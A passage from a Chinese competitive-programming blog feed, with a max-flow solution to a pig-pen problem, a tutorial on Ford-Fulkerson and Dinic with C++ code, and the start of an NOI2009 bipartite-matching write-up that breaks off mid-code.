<h2 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h2><p>这道题的建图简直是丧心病狂的难，首先拿到题目之后你会发现，这个建图怎么搞。首先访问是有顺序的，而且最重要的是，每个猪栏之间如果是同时打开的，还会交换，也就是说，一般的建图方法就是没有办法解出来的。</p>
<p>那么我们该怎么办呢，猪栏之间的流通怎么转换，而且顾客的访问是有顺序的。所以我们必须在顾客身上想办法。</p>
<p>那么我们可以将顾客之间连接一条无穷大的边，而且是后面的通过前面的，这样才能符合题目要求，那么具体要怎么做呢，首先我们建立一个源点一排顾客和一个汇点，猪栏就可以省掉了。读入每个顾客链接的猪栏，如果是第一个打开这个猪栏的，那么建造一条最大流为猪栏内猪的大小的边，连接顾客。然后如果这个猪栏别人已经开过了，就可以连接第一个开这个栏的人，这样通过这个人就可以在当前这个猪栏买到猪，而且这也符合了同时打开的猪栏可以交换的要求（通过连接的那个顾客访问当时可以打开的猪栏等价于交换）</p>
<p>最后我们只需要将顾客和汇点建立一条流大小为顾客购买的猪的数量的边，最后跑一遍Dinic算法就好（话说Dinic有时候真的很容易敲错，需要不停的练习）</p>
<h2 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> Point;</span><br><span class="line">    <span class="keyword">int</span> Next;</span><br><span class="line">    <span class="keyword">int</span> Back;</span><br><span class="line">    <span class="keyword">int</span> Value;</span><br><span class="line">&#125;a[<span class="number">40000</span>];</span><br><span class="line"><span class="keyword">int</span> n,m,Queue[<span class="number">40000</span>],num;</span><br><span class="line"><span class="keyword">int</span> Link[<span class="number">40000</span>],len,Maxx;</span><br><span class="line"><span class="keyword">int</span> c[<span class="number">4000</span>],ans,all;</span><br><span class="line"><span class="keyword">int</span> Level[<span class="number">40000</span>],X,Y,Z;</span><br><span class="line"><span class="keyword">int</span> vis[<span class="number">20000</span>],Pig[<span class="number">2000</span>];</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">In</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> This=<span class="number">0</span>,F=<span class="number">1</span>; <span class="keyword">char</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>) F=<span class="number">-1</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        This=This*<span class="number">10</span>+ch-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> This*F;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">GetLevel</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(Level,<span class="number">-1</span>,<span class="keyword">sizeof</span>(Level));</span><br><span class="line">    <span class="keyword">int</span> head=<span class="number">0</span>,tail=<span class="number">1</span>;</span><br><span class="line">    Queue[<span class="number">1</span>]=<span class="number">1</span>; Level[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(++head&lt;=tail)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[Queue[head]];i;i=a[i].Next)</span><br><span class="line">        <span class="keyword">if</span>(Level[a[i].Point]&lt;<span class="number">0</span>&amp;&amp;a[i].Value)</span><br><span class="line">        &#123;</span><br><span class="line">            Queue[++tail]=a[i].Point;</span><br><span class="line">            Level[Queue[tail]]=Level[Queue[head]]+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Level[Maxx]&gt;=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetMaxFlow</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> Flow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x==Maxx) <span class="keyword">return</span> Flow;</span><br><span class="line">    <span class="keyword">int</span> MaxFlow=<span class="number">0</span>,D=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[x];i&amp;&amp;MaxFlow&lt;Flow;i=a[i].Next)</span><br><span class="line">    <span class="keyword">if</span>(a[i].Value&amp;&amp;Level[a[i].Point]==Level[x]+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span>(D=GetMaxFlow(a[i].Point,min(Flow-MaxFlow,a[i].Value)))</span><br><span class="line">    &#123;</span><br><span class="line">        MaxFlow+=D;</span><br><span class="line">        a[i].Value-=D;</span><br><span class="line">        a[a[i].Back].Value+=D;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!MaxFlow) Level[x]=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> MaxFlow;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dinic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(GetLevel())</span><br><span class="line">    <span class="keyword">while</span>(ans=GetMaxFlow(<span class="number">1</span>,<span class="number">123456789</span>))</span><br><span class="line">    all+=ans;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;all&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initFirst</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> z)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    a[++len].Point=y;</span><br><span class="line">    a[len].Value=z;</span><br><span class="line">    a[len].Back=len+<span class="number">1</span>;</span><br><span class="line">    a[len].Next=Link[x];</span><br><span class="line">    Link[x]=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initSecond</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> z)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    a[++len].Point=y;</span><br><span class="line">    a[len].Value=z;</span><br><span class="line">    a[len].Back=len<span class="number">-1</span>;</span><br><span class="line">    a[len].Next=Link[x];</span><br><span class="line">    Link[x]=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    m=In(); n=In();</span><br><span class="line">    Maxx=n+<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++) Pig[i]=In();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Z=In();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=Z;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            Y=In();</span><br><span class="line">            <span class="keyword">if</span>(!vis[Y])</span><br><span class="line">            &#123;</span><br><span class="line">                initFirst(<span class="number">1</span>,i+<span class="number">1</span>,Pig[Y]);</span><br><span class="line">                initSecond(i+<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                initFirst(vis[Y],i+<span class="number">1</span>,<span class="number">123456789</span>);</span><br><span class="line">                initSecond(i+<span class="number">1</span>,vis[Y],<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            vis[Y]=i+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Z=In();</span><br><span class="line">        initFirst(i+<span class="number">1</span>,Maxx,Z);</span><br><span class="line">        initSecond(Maxx,i+<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Dinic();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>网络流</tag>
      </tags>
  </entry>
  <entry>
    <title>网络流-最大流求解</title>
    <url>/2017/05/24/b7e0e85b2c60/</url>
    <content><![CDATA[<h1 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h1><blockquote>
<p>其实很早以前就知道有这个网络流算法了，而且据说是特别难的（毕竟当时我连DP和图论都在仰望中）现在接触到了，很神奇，但是并没有想象中的那么难 <del>（毕竟可以背模板）</del></p>
</blockquote>
<p>这一篇主要是我最网络流的最大流的理解以及在求最大流的时候的Ford-Fulkerson算和Dinic算法。</p>
<h1 id="网络流"><a href="#网络流" class="headerlink" title="网络流"></a>网络流</h1><h2 id="网络流概念："><a href="#网络流概念：" class="headerlink" title="网络流概念："></a>网络流概念：</h2><blockquote>
<p>什么是网络？网络其实就是有向带权图。为什么要叫网络，是因为权值是容量，容量意味着可以在单位时间内经过的上限，但是可以比上限小。比如说我们一个运输的管道，每段管道都有一个最大水量，如果超出了这个最大水量，就会爆开水管，而这个运输管道系统就是一个网络流。</p>
</blockquote>
<h2 id="最大流："><a href="#最大流：" class="headerlink" title="最大流："></a>最大流：</h2><blockquote>
<p>寻找网络G上可能的最大流量(和一个有最大流量的可行流方案)，即为网络G上的最大流问题。</p>
</blockquote>
<h2 id="增广路径"><a href="#增广路径" class="headerlink" title="增广路径"></a>增广路径</h2><p>增广路径(可改进路径)的定义：</p>
<blockquote>
<p>若P是网络中连结源点s和汇点t的一条路，我们定义路的方向是从s到t，则路上的弧有两种：</p>
</blockquote>
<ul>
<li>前向弧—弧的方向与路的方向一致。前向弧的全体记为P+；</li>
<li>后向弧—弧的方向与路的方向相反。后向弧的全体记为P-；</li>
</ul>
<p>设F是一个可行流，P 是从s到t的一条路，若P满足下列条件：</p>
<blockquote>
<ul>
<li>在P+的所有前向弧(u,v)上，0≦f(u,v) &lt; C(u,v);</li>
</ul>
</blockquote>
<ul>
<li>在P-的所有后向弧(u,v)上，0&lt;f(u,v) ≦C(u,v);</li>
</ul>
<p>则称P是关于可行流F的一条可增广路径。</p>
<p><img src="https://xorex.space/image/052.png"></p>
<p>上图中的S-A-C-B-D-E-T 为一增广路径。其中(C,B)为后向弧，其它为前向弧。</p>
<h2 id="残留网络"><a href="#残留网络" class="headerlink" title="残留网络"></a>残留网络</h2><blockquote>
<p>由于要考虑前向弧、后向弧，分析、描述时不简洁，在图上直观看也不容易看出增广路径。因此我们把已经有的流量从容量中分离出来表示，引入一个与原问题等价的附加网络：残留网络。</p>
</blockquote>
<p>那么我们就可以将图进行一下改进：</p>
<p><img src="https://xorex.space/image/053.png"></p>
<p>在这张图上，我们找增广路径显的非常直观了!</p>
<h2 id="最大流求解"><a href="#最大流求解" class="headerlink" title="最大流求解"></a>最大流求解</h2><p>最大流定理：<br>如果残留网络上找不到增广路径，则当前流为最大流；反之，如果当前流不为最大流，则一定有增广路径。</p>
<h1 id="Ford-Fulkerson算法"><a href="#Ford-Fulkerson算法" class="headerlink" title="Ford-Fulkerson算法"></a>Ford-Fulkerson算法</h1><h2 id="算法讲解："><a href="#算法讲解：" class="headerlink" title="算法讲解："></a>算法讲解：</h2><p>对于Ford-Fulkerson算法来说无论是理解方面还是代码实现，都是非常简单的，但是这种简单也决定了它效率并不是很高，至少是要比Dinic要低一些的。所以说还是要练习好Dinic算法。</p>
<p>Ford-Fulkerson算法核心就是不听的寻找增广路径，不过然后利用一个Forward来记录下来这个路径的最小增加流，然后加到最终答案all中，并且利用这个Forward来更新路上的所有路径的值，也就是一个前向弧和一个后向弧（一个减，一个加）。这样不停地找直到没有办法找到增广路径为止。</p>
<p>Ford-Fulkerson用邻接矩阵的代码是非常少的，但是相对应的空间和时间的复杂度都会提高（指的是常数），所以最好还是用邻接表（QAQ如果数据的范围比较少的话直接上邻接矩阵的Ford-Fulkerson）</p>
<p>更重要的是，Ford-Fulkerson算法可能会被某些丧心病狂的老师卡掉（毕竟简单好写），而Ford-Fulkerson算法就是通过边权进行修改的，那么如果构成一条路的边权非常大，而另外一条边比较小，则会更新非常多次，所以更加证明了要去学Dinic算法。</p>
<p>比如下图：</p>
<p><img src="https://xorex.space/image/054.jpg"></p>
<p>我们知道，Ford-Fulkerson算法是每次找到一条增广路径，<br>这个图中如果用Ford-Fulkerson算法，b—c这条边的退流将会做1000次，极大的影响算法的效率。一定要提防某些丧心病狂的老师！！！具体为什么会退流1000次可以模拟计算一下；</p>
<p>在读入数据的时候一定要记得可能会出现重边的现象，这就和图不一<br>定是联通的道理一样的。</p>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,dis[<span class="number">400</span>][<span class="number">400</span>];</span><br><span class="line"><span class="keyword">int</span> x,y,z,all,Forward;</span><br><span class="line"><span class="keyword">bool</span> Get=<span class="literal">true</span>,vis[<span class="number">400</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> Line)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vis[x]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(x==n)</span><br><span class="line">    &#123;</span><br><span class="line">        Get=<span class="literal">true</span>;</span><br><span class="line">        all+=Line;</span><br><span class="line">        Forward=Line;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">if</span>(dis[x][i]&gt;<span class="number">0</span>&amp;&amp;!vis[i])</span><br><span class="line">    &#123;</span><br><span class="line">        DFS(i,min(dis[x][i],Line));</span><br><span class="line">        <span class="keyword">if</span>(Get)</span><br><span class="line">        &#123;</span><br><span class="line">            dis[x][i]-=Forward;</span><br><span class="line">            dis[i][x]+=Forward;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;m&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;x&gt;&gt;y&gt;&gt;z;</span><br><span class="line">        dis[x][y]+=z;<span class="comment">//有可能出现重边</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(Get)</span><br><span class="line">    &#123;</span><br><span class="line">        Get=<span class="literal">false</span>;</span><br><span class="line">        <span class="built_in">memset</span>(vis,<span class="literal">false</span>,<span class="keyword">sizeof</span>(vis));</span><br><span class="line">        DFS(<span class="number">1</span>,<span class="number">123456789</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;all&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="Dinic算法"><a href="#Dinic算法" class="headerlink" title="Dinic算法"></a>Dinic算法</h1><h2 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h2><blockquote>
<p>果然网络流不愧是高级算法啊，整整用了三节课，才弄懂Dinic算法，其实是讲稿写的并不清楚！！！</p>
</blockquote>
<blockquote>
<p>网络流真的是很神奇啊 <del>（好像我每个算法都是这么说的）</del></p>
</blockquote>
<h2 id="算法讲解：-1"><a href="#算法讲解：-1" class="headerlink" title="算法讲解："></a>算法讲解：</h2><p>Dinic算分和Ford-Fulkerson的主要区别就是Dinic算法是在Ford-Fulkerson算法里面，是每次一单独进行寻找增广路的，但是在Dinic里面，因为需要进行将图中的所有增广路都跟新掉，所以是进行分层操作，然后将一张图根据访问时间进行区分层次。这里分层的目的有两个： <del>（以下为我的个人理解可能不对）</del></p>
<p>第一个就是通过进行分层来查看是否还存在有增广路，其次就是通过分层来防止DFS的死循环。因为在Dinic算法里面，我们进行的DFS的过程中，是需要更新所有的增广路，所以就可以重复的访问某一条边，但如果出现环的情况，就会死循环，那么为了防止这种情况的产生就需要进行分层。而普通的进行bool类型的vis数组标记是没有办法实现的。</p>
<p>我们进行分层之后，每次选择走的路都是一条最短的路，这样相对来说可以更新的流更大些，提高算法运行速度。</p>
<p>然后就是进行DFS更新利用MAXFlow来记录下来自己这里可以通过流量的当前最大值，然后Flow是可以分给下一个人的最大流量，如果找到了汇总点，那么我们就求出了这条增广路所能增广的最大值，将它加到MaxFlow里面，如果自己能够提供的流量，也就是min(上一个人给自己的流量,自己本身最大的流量)等于了MaxFlow，我们就可以进行剪枝了，因为下面已经不可能再通过任何多余的流了。</p>
<p>最后返回可增广的最大流的时候判断一下，如果为零，那么以后也不可能再增广了，就不需要访问他了，那么直接将分层标记改为-1，进行优化。</p>
<p>网络流还需要多多联系！建图能力必须要上去！</p>
<h2 id="代码实现："><a href="#代码实现：" class="headerlink" title="代码实现："></a>代码实现：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> Point;</span><br><span class="line">    <span class="keyword">int</span> Value;</span><br><span class="line">    <span class="keyword">int</span> Back;</span><br><span class="line">    <span class="keyword">int</span> Next;</span><br><span class="line">&#125;a[<span class="number">2000</span>];</span><br><span class="line"><span class="keyword">int</span> n,m,x,y,z,len,Queue[<span class="number">400</span>];</span><br><span class="line"><span class="keyword">int</span> Link[<span class="number">500</span>],Level[<span class="number">400</span>],all;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">GetLevel</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(Level,<span class="number">-1</span>,<span class="keyword">sizeof</span>(Level));</span><br><span class="line">    <span class="keyword">int</span> head=<span class="number">0</span>,tail=<span class="number">1</span>;</span><br><span class="line">    Queue[<span class="number">1</span>]=<span class="number">1</span>; Level[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(++head&lt;=tail)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[Queue[head]];i;i=a[i].Next)</span><br><span class="line">        <span class="keyword">if</span>(Level[a[i].Point]&lt;<span class="number">0</span>&amp;&amp;a[i].Value)</span><br><span class="line">        &#123;</span><br><span class="line">            Queue[++tail]=a[i].Point;</span><br><span class="line">            Level[Queue[tail]]=Level[Queue[head]]+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Level[n]&gt;=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetMaxFlow</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> Flow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x==n) <span class="keyword">return</span> Flow;</span><br><span class="line">    <span class="keyword">int</span> MaxFlow=<span class="number">0</span>,D=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[x];i&amp;&amp;MaxFlow&lt;Flow;i=a[i].Next)</span><br><span class="line">    <span class="keyword">if</span>(a[i].Value&amp;&amp;Level[a[i].Point]==Level[x]+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span>(D=GetMaxFlow(a[i].Point,min(Flow-MaxFlow,a[i].Value)))</span><br><span class="line">    &#123;</span><br><span class="line">        MaxFlow+=D;</span><br><span class="line">        a[i].Value-=D;</span><br><span class="line">        a[a[i].Back].Value+=D;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!MaxFlow) Level[x]=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> MaxFlow;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dinic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans;</span><br><span class="line">    <span class="keyword">while</span>(GetLevel())</span><br><span class="line">    <span class="keyword">while</span>(ans=GetMaxFlow(<span class="number">1</span>,<span class="number">123456789</span>)) all+=ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;m&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;x&gt;&gt;y&gt;&gt;z;</span><br><span class="line">        a[++len].Point=y;</span><br><span class="line">        a[len].Next=Link[x];</span><br><span class="line">        a[len].Back=len+<span class="number">1</span>;</span><br><span class="line">        a[len].Value=z;</span><br><span class="line">        Link[x]=len;</span><br><span class="line">        a[++len].Point=x;</span><br><span class="line">        a[len].Next=Link[y];</span><br><span class="line">        a[len].Back=len<span class="number">-1</span>;</span><br><span class="line">        a[len].Value=<span class="number">0</span>;</span><br><span class="line">        Link[y]=len;</span><br><span class="line">    &#125;</span><br><span class="line">    Dinic();</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;all&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>总结</tag>
        <tag>网络流</tag>
      </tags>
  </entry>
  <entry>
    <title>二分图匹配题解</title>
    <url>/2017/05/24/d1adae273bab/</url>
    <content><![CDATA[<h1 id="说在前面："><a href="#说在前面：" class="headerlink" title="说在前面："></a>说在前面：</h1><blockquote>
<p>终于搞完了二分图匹配，所以特意来总结一下QAQ</p>
</blockquote>
<h1 id="NOI2009-变换序列"><a href="#NOI2009-变换序列" class="headerlink" title="NOI2009 变换序列"></a>NOI2009 变换序列</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><p><img src="https://xorex.space/image/051.jpg"></p>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>   第一行包含一个整数N，表示序列的长度。接下来的一行包含N个整数Di，其中Di表示i和Ti之间的距离。</p>
</blockquote>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>如果至少存在一个满足要求的变换序列T，则输出文件中包含一行N个整数，表示你计算得到的字典序最小的T；否则输出”No Answer”（不含引号）。</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p>这道题首先你学要知道这个公式的意思是什么，上面这个指的是给你一个队列，这个队列是1到n的所有元素，并且代表着是你要求的一个队列和1到n这个顺序队列通过一个公式求出来的距离，公式：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">d[i]=min(a[i]-b[i],n-|a[i]-b[i]|)</span><br></pre></td></tr></table></figure>
<p>大概就是这样。</p>
<p>所以说我们可以通过上面的那个公式建立起来一个联系，也就是说，给定你的队列d是一个通过两种方法求出来的，分别是 <code>a[i]-b[i]</code> 和 <code>n-|a[i]-b[i]|</code> ，我们需要判断他是由哪一个过来的，可能是其中一个，也有可能是其中的两个，这样我们将给定的队列和1-n进行连接，形成一个二分图。</p>
<p>建立起来二分图之后，我们就可以开始求要求的那个序列了也就是说，对于一个给定的序列d，有多中答案所对应的需要求出来的那个序列，题目上要求求出来字典序比较小的那一个，那么我们就可以用一个小小的贪心，在建立一个二分图的时候，我们将比较大的点留在后面，这样的话我们用邻接表访问的时候可以优先访问比较大的那个点（如果你用的是邻接矩阵的话直接进行倒序查找），然后我们在进行倒序循环，每次选择比较大的点进行匹配，这样的话后面的点选择的都是能选择的最大的点，这样的话就可以符合题目上面的要求，求出来字典序比较小的队列了。</p>
<p>最后进行数组匹配，然后按照顺序进行输出</p>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,d[<span class="number">20000</span>],Get[<span class="number">20000</span>];</span><br><span class="line"><span class="keyword">int</span> len,Link[<span class="number">20000</span>],ans[<span class="number">20000</span>];</span><br><span class="line"><span class="keyword">bool</span> vis[<span class="number">20000</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> Point;</span><br><span class="line">    <span class="keyword">int</span> Next;</span><br><span class="line">&#125;a[<span class="number">40000</span>];</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">In</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> This=<span class="number">0</span>,F=<span class="number">1</span>; <span class="keyword">char</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(ch&lt;<span class="string">&#x27;0&#x27;</span>||ch&gt;<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>) F=<span class="number">-1</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(ch&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;ch&lt;=<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        This=(This&lt;&lt;<span class="number">1</span>)+(This&lt;&lt;<span 